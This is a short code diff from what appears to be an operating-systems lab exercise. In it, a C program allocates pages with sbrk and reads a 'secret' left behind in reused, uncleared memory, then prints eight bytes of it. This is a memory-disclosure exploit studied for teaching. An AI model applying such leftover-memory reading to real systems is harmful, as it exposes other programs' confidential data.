@@ -10,14 +10,24 @@ main(int argc, char *argv[])
   // (e.g., write(2, secret, 8)
   // attack stack lives at 84215045
 
-  int amount = 32;
-  for (int i = 0; i < 1000; i++) {
-    int* start = (int*) 0x0;
-    char tmp[amount];
-    memmove(tmp, start + (amount * i), amount);
-    printf("Old start: %p, new start: %p: %d\n", start, (start + amount * i), *start);
-  }
-  // // write(2, secret, 8);
+  // char arr[2];
+  // arr[0] = '9';
+  // arr[1] = '\0';
+  char *start = sbrk(PGSIZE*32);  // get the start of the memory
+  char* secret = start + (PGSIZE * 16) + 32;
+  // printf("%s", start + (PGSIZE * 16) + 32);
+  // start += (16 * PGSIZE);
+  // for (int j = 0; j < 1; j++) {
+  //   printf("-----------------PAGE %d-----------------\n", j);
+  //   for (int i = 32; i < 45; i++) {
+  //     arr[0] = start[i];
+  //     printf("%s", arr);
+  //   }
+  //   printf("\n");
+  //   start += PGSIZE;
+  // }
+
+  write(2, secret, 8);
 
   exit(1);
 }
